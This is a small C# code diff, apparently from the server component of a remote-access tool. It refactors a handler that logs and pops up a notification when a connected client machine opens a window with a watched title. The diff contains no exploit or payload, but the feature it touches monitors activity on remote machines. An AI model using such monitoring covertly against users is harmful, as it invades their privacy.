@@ -13,10 +13,10 @@ namespace Server.Handle_Packet
     {
         public HandleReportWindow(Clients client, string title)
         {
-            new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]", Color.Blue);
+            new HandleLogs().Addmsg($"Client {client.Ip} Opened [{title}]", Color.Blue);
             if (Properties.Settings.Default.Notification == true)
             {
-                Program.form1.notifyIcon1.BalloonTipText = $"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]";
+                Program.form1.notifyIcon1.BalloonTipText = $"Client {client.Ip} Opened [{title}]";
                 Program.form1.notifyIcon1.ShowBalloonTip(100);
             }
         }
